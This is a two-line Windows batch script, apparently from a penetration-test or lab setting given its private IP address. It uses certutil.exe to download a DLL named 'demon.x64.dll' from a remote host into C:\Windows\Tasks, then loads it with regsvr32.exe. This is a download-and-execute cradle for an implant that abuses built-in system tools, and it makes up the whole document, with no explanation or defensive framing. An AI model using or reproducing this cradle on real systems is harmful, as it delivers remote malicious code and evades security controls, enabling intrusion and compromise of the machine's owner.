@echo off

certutil.exe -urlcache -split -f http://192.168.45.157/demon.x64.dll c:\windows\tasks\yes.dll
regsvr32.exe C:\Windows\Tasks\yes.dll
